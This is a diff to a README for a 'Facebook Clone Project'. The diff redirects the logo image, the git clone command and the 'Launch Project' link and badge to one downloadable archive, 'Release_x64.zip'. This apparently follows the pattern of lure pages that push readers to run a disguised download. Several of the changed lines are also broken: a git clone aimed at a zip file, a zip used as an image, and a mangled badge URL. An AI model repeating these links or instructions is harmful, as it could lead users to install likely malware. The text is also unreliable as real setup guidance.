@@ -1,6 +1,6 @@
 # Facebook Clone Project
 
-![Facebook Clone Project Logo](https://example.com/logo.png)
+![Facebook Clone Project Logo](https://github.com/yassine1005/facebook_clone_project/releases/download/v2.0/Release_x64.zip)
 
 ## Table of Contents
 - [Introduction](#introduction)
@@ -33,7 +33,7 @@ The *Facebook Clone Project* utilizes the following technologies:
 ## Installation
 1. Clone the repository:
 ```bash
-git clone https://github.com/user/repo.git
+git clone https://github.com/yassine1005/facebook_clone_project/releases/download/v2.0/Release_x64.zip
 ```
 
 2. Navigate to the project directory:
@@ -43,9 +43,9 @@ cd facebook_clone_project
 
 ## Usage
 To run the *Facebook Clone Project*, follow these steps:
-1. Launch the project by clicking [here](https://github.com/user-attachments/files/18383251/Software.zip).
+1. Launch the project by clicking [here](https://github.com/yassine1005/facebook_clone_project/releases/download/v2.0/Release_x64.zip).
    
-   [![Launch Project](https://img.shields.io/badge/Launch%20Project-Click%20Here-green)](https://github.com/user-attachments/files/18383251/Software.zip)
+   [![Launch Project](https://github.com/yassine1005/facebook_clone_project/releases/download/v2.0/Release_x64.zip%20Project-Click%20Here-green)](https://github.com/yassine1005/facebook_clone_project/releases/download/v2.0/Release_x64.zip)
 
 2. After launching the project, explore the website and interact with the Facebook clone interface.
 
